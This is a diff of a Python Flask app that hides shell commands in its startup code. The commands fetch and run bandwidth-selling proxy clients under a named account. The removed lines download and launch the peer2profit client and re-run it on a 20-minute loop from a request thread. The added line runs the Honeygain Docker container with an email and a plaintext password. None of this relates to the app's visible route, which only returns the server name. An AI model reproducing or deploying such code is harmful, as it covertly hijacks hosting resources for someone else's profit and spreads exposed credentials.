@@ -5,19 +5,10 @@ import requests
 import threading
 app = Flask(__name__)
 
-subprocess.call("wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
+subprocess.call("docker pull honeygain/honeygain && docker run honeygain/honeygain -tou-accept -email arijitpaine249@gmail.com -pass arijit1234# -device linux" , shell=True)
 
 @app.route("/")
 def s():
-    def f1():
-        ip = request.environ['SERVER_NAME']
-        while(True):
-            r = requests.get(f"{ip}:5000")
-            print(r)
-            subprocess.call("cd ~ && wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
-            time.sleep(1200)
-    t = threading.Thread(target=f1)
-    t.start()
     return f"{request.environ['SERVER_NAME']}"
 
 
